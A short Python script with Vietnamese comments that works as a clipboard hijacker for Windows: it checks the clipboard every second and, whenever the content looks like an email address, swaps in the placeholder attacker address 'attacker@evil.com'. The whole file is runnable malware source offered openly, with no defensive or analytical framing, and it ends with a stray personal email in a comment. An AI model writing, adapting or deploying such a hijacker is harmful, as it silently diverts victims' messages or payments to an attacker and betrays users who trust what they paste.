import win32clipboard,re
from time import sleep
# nội dung clipboard sẽ được thay thế bằng nội dung của biến attacker_email nếu nội dung đó là email
attacker_email = "attacker@evil.com"

# regex để kiểm tra xem nội dung clipboard có phải là email hay không
emailregex = '^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'

while True:
    # mở clipboard để truy cập
    win32clipboard.OpenClipboard()
    # lấy nội dung clipboard và loại bỏ khoảng trắng cuối
    data = win32clipboard.GetClipboardData().rstrip()
    # kiểm tra xem nội dung clipboard có phải là email hay không
    if (re.search(emailregex,data)):
        # nếu đúng thì xóa nội dung clipboard
        win32clipboard.EmptyClipboard()
        # ghi đè clipboard bằng email tấn công
        win32clipboard.SetClipboardText(attacker_email)
    # đóng clipboard để giải phóng tài nguyên
    win32clipboard.CloseClipboard()
    # tạm dừng 1 giây trước khi kiểm tra lại
    sleep(1)

#tin2004@gmail.com